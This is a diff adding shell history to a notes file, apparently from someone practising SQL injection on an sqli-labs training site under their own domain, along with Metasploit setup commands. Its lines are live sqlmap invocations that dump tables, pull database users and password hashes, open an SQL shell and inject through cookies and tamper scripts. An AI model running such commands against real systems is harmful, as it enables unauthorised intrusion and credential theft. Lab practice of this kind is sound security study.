@@ -71,6 +71,63 @@
   441  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-9/index.php?id=1" --dbs --batch --leve=5 --risk=3 --dbms=mysql --thread 10
 
 
+  442  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1" -D "security" -T "uagents" --col
+  443  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1" -D "security" -T "uagents" -C "id,uagent" --dump
+  444  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" 
+  445  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" -users
+  446  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" -password
+  447  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" -passwords
+  448  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" -batch
+  449  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-6/index.php?id=1" -batch
+  450  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1" -passwords
+  451  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-7/index.php?id=1" --dbs
+  452  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-8/index.php?id=1" --dbs --batch --leve=5 --risk=3
+  453  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-8/index.php?id=1" --dbs --batch --leve=5 --risk=3 --dbms=mysql --thread 10
+  454  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-9/index.php?id=1" --dbs --batch --leve=5 --risk=3 --dbms=mysql --thread 10
+  455  history 
+  456  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less11
+  457  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less11 --level=3 --risk=3 --dbs --thread 10
+  458  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less11 --level=3 --risk=3 --dbs 
+  459  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less12-15.txt --level=3 --risk=3 --dbs 
+  460  history 
+  461  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less12-15.txt --level=3 --risk=3 --dbs --batch 
+  462  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less12-15.txt --level=3 --risk=3 --dbs 
+
+  410  msfconsole
+  411  sudo apt install bundler:1.17.3
+  412  sudo apt install bundler:1.17
+  413  gem install bundler:1.17.3
+  414  sudo gem install bundler:1.17.3
+  415  msfconsole
+  416  bundle install
+  417  sudo gem install bundler -v 2.2.4
+  418  sudo msfdb reinit
+  419  sudo msfconsole
+
+
+  467  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-20/" --dbs --batch --leve=5 --risk=3 --dbms=mysql --thread 10 --cookie "uname=admin"
+  468  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-21/" --dbs --batch --leve=5 --risk=3 --dbms=mysql --thread 10 --tamper=base64encode
+  469  history 
+  470  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less12-15.txt --level=3 --risk=3 --dbs 
+  471  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less12-15.txt --level=3 --risk=3 --sql-shell
+  472  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less17.txt --level=5 --risk=3 -p= "passwd"
+  473  cat /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less17.txt
+  474  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less17.txt --level=5 --risk=3 -p= "passwd"
+  475  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less17.txt --level=5 --risk=3
+  476  cat /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less17.txt
+  477  vim /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less17.txt
+  478  sqlmap -r /home/xiaoxiaoran/temp/burp_proxy/sqlmap_less17.txt --level=5 --risk=3
+  479  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" -p id --current-db
+  480  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1*"  --current-db
+  481  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-20/" --cookie="uname=admin*" -f
+  482  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-20/" --cookie="uname=admin*" -dbs
+  483  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-20/" --cookie="uname=admin*" --dbms mysql
+  484  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-20/" --cookie="UM_distinctid=17991fa895d9-011ac6353fbc2-30634644-1fa400-17991fa895f9c; CNZZDATA155540=cnzz_eid%3D1465921256-1621648546-%26ntime%3D1621729583*" --dbms mysql
+  485  clear
+  486  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-33/"  --dbms mysql -dbs --thread 10 --tamper="unmagicquotes.py" -v 3 --batch
+  487  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-33/?id=1"  --dbms mysql -dbs --thread 10 --tamper="unmagicquotes.py" -v 3 --batch
+  488  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-33/?id=1"  --dbms mysql  --thread 10 --tamper="unmagicquotes.py" -v 3 --batch  -D "xiaoxiaoran" --tables
+	
 
 
 
